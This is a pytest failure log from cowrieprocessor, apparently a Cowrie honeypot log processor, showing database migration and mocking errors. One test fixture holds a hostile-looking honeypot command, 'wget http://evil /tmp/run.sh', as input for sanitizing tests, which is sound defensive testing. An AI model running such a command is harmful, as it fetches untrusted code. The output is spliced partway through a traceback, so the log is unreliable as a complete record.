FFFFFFFFFFFFFFF.........................F.FFFFFFFFFFFFF....FF....FFFFFFF [ 13%]
FFFFFF......................FFF.............................F........... [ 27%]
F...F.F................................................................. [ 41%]
FF.........................................F.F.FF.......F............... [ 54%]
...........F...F....FF.FFFFFFFFFF..FFFFFFF.FFFFF............FF.......... [ 68%]
FFF.F.FF......F..FF...FFF............................................... [ 82%]
........................................................................ [ 95%]
......................                                                   [100%]
=================================== FAILURES ===================================
_____________________ test_bulk_loader_inserts_raw_events ______________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-34/test_bulk_loader_inserts_raw_e0')

    def test_bulk_loader_inserts_raw_events(tmp_path) -> None:
        """Loader should persist events, sanitize commands, and populate summaries."""
        events = [
            {
                "session": "abc123",
                "eventid": "cowrie.session.connect",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
                "sensor": "sensor-a",
            },
            {
                "session": "abc123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:01:00Z",
                "input": "wget http://evil /tmp/run.sh",
                "sensor": "sensor-a",
            },
        ]
        source = tmp_path / "events.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:53: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:28: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home..FFF                   [ 29%]
tests/unit/test_bulk_loader.py FFFFFFF                                   [ 30%]
tests/unit/test_bulk_loader_defanging.py FFFFFFFF                        [ 31%]
tests/unit/test_cache_security.py .......                                [ 32%]
tests/unit/test_command_defanging.py ..................                  [ 35%]
tests/unit/test_cowrie_db_cli.py F.FFFFFFFFFFFFF                         [ 37%]
tests/unit/test_cowrie_db_types.py ....FF....FFFFFFFFFFFFF...            [ 40%]
tests/unit/test_cowrie_malware_enrichment.py ..                          [ 40%]
tests/unit/test_database_settings.py ......                              [ 41%]
tests/unit/test_db_feature_detection.py ...........                      [ 43%]
tests/unit/test_delta_loader.py FFF                                      [ 43%]
tests/unit/test_enrich_password_tracking.py .                            [ 43%]
tests/unit/test_enrich_passwords_cli.py ..............                   [ 45%]
tests/unit/test_enrichment_cache.py ......                               [ 46%]
tests/unit/test_enrichment_handlers.py ........F...........F...F.F       [ 49%]
tests/unit/test_enrichment_telemetry.py .................                [ 52%]
tests/unit/test_es_publisher.py ..                                       [ 52%]
tests/unit/test_file_processor.py ...................................    [ 57%]
tests/unit/test_files_table.py ...........                               [ 58%]
tests/unit/test_health_cli.py FF                                         [ 58%]
tests/unit/test_hibp_client.py ..............                            [ 60%]
tests/unit/test_json_utils.py ..........................                 [ 64%]
tests/unit/test_mock_enrichment_handlers.py .F.F.FF.......F.......       [ 67%]
tests/unit/test_otel_tracing.py ..                                       [ 67%]
tests/unit/test_password_extractor.py ..............                     [ 69%]
tests/unit/test_process_cowrie.py ...F...F                               [ 70%]
tests/unit/test_process_cowrie_simple.py ....                            [ 70%]
tests/unit/test_process_cowrie_types.py FF.FFFFFFFFFF..FFFFFFF.F         [ 74%]
tests/unit/test_quarantine_payload_fix.py FFFF                           [ 74%]
tests/unit/test_rate_limiting.py ............FF....                      [ 77%]
tests/unit/test_refresh_cache_simple.py ......                           [ 77%]
tests/unit/test_refresh_cache_types.py FFF.F.FF......F..                 [ 80%]
tests/unit/test_report_cli.py FF                                         [ 80%]
tests/unit/test_reporting_builders.py .                                  [ 80%]
tests/unit/test_reporting_dal.py ..                                      [ 80%]
tests/unit/test_schema_migrations.py FFF                                 [ 81%]
tests/unit/test_secrets_resolver.py ......                               [ 81%]
tests/unit/test_session_enumerator.py ..                                 [ 82%]
tests/unit/test_snowshoe_detection.py .......................            [ 85%]
tests/unit/test_ssh_key_extractor.py ..................                  [ 87%]
tests/unit/test_status_emitter.py .                                      [ 87%]
tests/unit/test_threat_detection_types.py ......................         [ 90%]
tests/unit/test_unicode_cleanup_utility.py ...........                   [ 92%]
tests/unit/test_unicode_sanitizer.py ....................                [ 94%]
tests/unit/test_virustotal_handler.py .........................          [ 98%]
tests/unit/test_virustotal_quota.py ..........                           [ 99%]
tests/unit/test_virustotal_serialization.py ...                          [100%]

==================================== ERRORS ====================================
_________________ ERROR at setup of test_database_connectivity _________________
file /home/speterson/cowrieprocessor/scripts/test_longtail_with_database.py, line 30
  def test_database_connectivity(db_url: str) -> bool:
E       fixture 'db_url' not found
>       available fixtures: cache, capfd, capfdbinary, caplog, capsys, capsysbinary, cov, doctest_namespace, monkeypatch, no_cover, pytestconfig, record_property, record_testsuite_property, record_xml_attribute, recwarn, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory
>       use 'pytest --fixtures [testpath]' for help on them.

/home/speterson/cowrieprocessor/scripts/test_longtail_with_database.py:30
_______________________ ERROR at setup of test_migration _______________________
file /home/speterson/cowrieprocessor/test_migration.py, line 17
  def test_migration(db_url: str) -> bool:
E       fixture 'db_url' not found
>       available fixtures: cache, capfd, capfdbinary, caplog, capsys, capsysbinary, cov, doctest_namespace, monkeypatch, no_cover, pytestconfig, record_property, record_testsuite_property, record_xml_attribute, recwarn, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory
>       use 'pytest --fixtures [testpath]' for help on them.

/home/speterson/cowrieprocessor/test_migration.py:17
_ ERROR at setup of TestSessionEnrichmentIntegration.test_session_enrichment_with_all_services _

    @pytest.fixture
    def mock_enrichment_handlers():
        """Mock all enrichment handlers for integration testing."""
        with (
>           patch('process_cowrie.enrichment_vt_query') as mock_vt,
            patch('process_cowrie.enrichment_dshield_query') as mock_dshield,
            patch('process_cowrie.enrichment_safe_read_uh_data') as mock_urlhaus,
            patch('process_cowrie.enrichment_read_spur_data') as mock_spur,
        ):

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:72: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <unittest.mock._patch object at 0x7756b26e0210>

    def get_original(self):
        target = self.getter()
        name = self.attribute
    
        original = DEFAULT
        local = False
    
        try:
            original = target.__dict__[name]
        except (AttributeError, KeyError):
            original = getattr(target, name, DEFAULT)
        else:
            local = True
    
        if name in _builtins and isinstance(target, ModuleType):
            self.create = True
    
        if not self.create and original is DEFAULT:
>           raise AttributeError(
                "%s does not have the attribute %r" % (target, name)
            )
E           AttributeError: <module 'process_cowrie' from '/home/speterson/cowrieprocessor/process_cowrie.py'> does not have the attribute 'enrichment_vt_query'

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: AttributeError
_ ERROR at setup of TestSessionEnrichmentIntegration.test_file_enrichment_integration _

    @pytest.fixture
    def mock_enrichment_handlers():
        """Mock all enrichment handlers for integration testing."""
        with (
>           patch('process_cowrie.enrichment_vt_query') as mock_vt,
            patch('process_cowrie.enrichment_dshield_query') as mock_dshield,
            patch('process_cowrie.enrichment_safe_read_uh_data') as mock_urlhaus,
            patch('process_cowrie.enrichment_read_spur_data') as mock_spur,
        ):

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:72: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <unittest.mock._patch object at 0x7756b26bb930>

    def get_original(self):
        target = self.getter()
        name = self.attribute
    
        original = DEFAULT
        local = False
    
        try:
            original = target.__dict__[name]
        except (AttributeError, KeyError):
            original = getattr(target, name, DEFAULT)
        else:
            local = True
    
        if name in _builtins and isinstance(target, ModuleType):
            self.create = True
    
        if not self.create and original is DEFAULT:
>           raise AttributeError(
                "%s does not have the attribute %r" % (target, name)
            )
E           AttributeError: <module 'process_cowrie' from '/home/speterson/cowrieprocessor/process_cowrie.py'> does not have the attribute 'enrichment_vt_query'

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: AttributeError
_ ERROR at setup of TestConcurrentEnrichmentProcessing.test_multiple_sessions_enrichment _

    @pytest.fixture
    def mock_enrichment_handlers():
        """Mock all enrichment handlers for integration testing."""
        with (
>           patch('process_cowrie.enrichment_vt_query') as mock_vt,
            patch('process_cowrie.enrichment_dshield_query') as mock_dshield,
            patch('process_cowrie.enrichment_safe_read_uh_data') as mock_urlhaus,
            patch('process_cowrie.enrichment_read_spur_data') as mock_spur,
        ):

/home/speterson/cowrieprocessor/tests/integration/test_enrichment_integration.py:72: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1497: in __enter__
    original, local = self.get_original()
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <unittest.mock._patch object at 0x7756b26e3bd0>

    def get_original(self):
        target = self.getter()
        name = self.attribute
    
        original = DEFAULT
        local = False
    
        try:
            original = target.__dict__[name]
        except (AttributeError, KeyError):
            original = getattr(target, name, DEFAULT)
        else:
            local = True
    
        if name in _builtins and isinstance(target, ModuleType):
            self.create = True
    
        if not self.create and original is DEFAULT:
>           raise AttributeError(
                "%s does not have the attribute %r" % (target, name)
            )
E           AttributeError: <module 'process_cowrie' from '/home/speterson/cowrieprocessor/process_cowrie.py'> does not have the attribute 'enrichment_vt_query'

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:1467: AttributeError
_ ERROR at setup of TestFileEnrichmentFlow.test_bulk_loader_processes_file_events _

test_db_path = 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_bulk_loader_processes_fil0/test.db'

    @pytest.fixture
    def engine(test_db_path):
        """Create database engine for testing."""
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(test_db_path)
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_files_enrichment_flow.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26f35b0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:39:35,645:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:35,646:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:35,654:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:35,655:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:35,658:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:35,661:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:35,662:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:35,665:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:35,666:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:35,667:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:35,668:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:35,671:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:35,672:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:35,673:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:35,674:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:35,677:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:35,678:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:35,679:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:35,679:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:35,679:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_ ERROR at setup of TestFileEnrichmentFlow.test_files_table_enrichment_status __

test_db_path = 'sqlite:////tmp/pytest-of-speterson/pytest-33/test_files_table_enrichment_st0/test.db'

    @pytest.fixture
    def engine(test_db_path):
        """Create database engine for testing."""
        engine = create_engine_from_settings(load_database_settings())
        # Override with test database path
        from sqlalchemy import create_engine
    
        engine = create_engine(test_db_path)
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_files_enrichment_flow.py:30: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26bab30>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:39:38,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:38,790:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:38,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:38,798:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:38,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:38,801:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:38,803:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:38,804:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:38,805:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:38,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:38,810:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:38,811:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:38,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:38,813:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:38,813:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:38,814:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:38,816:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:38,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:38,817:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
